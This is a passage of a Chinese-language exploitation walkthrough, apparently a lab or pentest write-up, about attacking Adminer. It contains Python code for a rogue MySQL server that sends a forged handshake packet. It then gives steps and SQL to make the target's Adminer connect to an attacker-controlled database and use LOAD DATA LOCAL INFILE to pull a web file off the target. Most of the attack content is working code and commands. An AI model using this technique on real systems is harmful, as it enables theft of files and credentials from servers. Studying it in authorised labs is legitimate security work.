```

sv.setsockopt(1,2,1)
sv.bind(("",3306))
sv.listen(5)
conn,address=sv.accept()

conn.sendall("\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00")
```

### 利用二：

攻击机新建库和表，开启外连

```
create database adminer;

use adminer;

create table test(text text(4096));
```

![](../Images/74bda9e1e99d6f39fe0e5e7510f4c4d9.png)

访问靶机，输入攻击机的数据库信息

> 靶机需要 secure\_file\_priv 为空，为 null 导出不了

![](../Images/4969a75a23bae95c1040a7597e59d583.png)

```
load data local infile "C:\\\\phpstudy\_pro\\\\WWW\\\\1.php" into table test FIELDS TERMINATED BY '\\n';
```
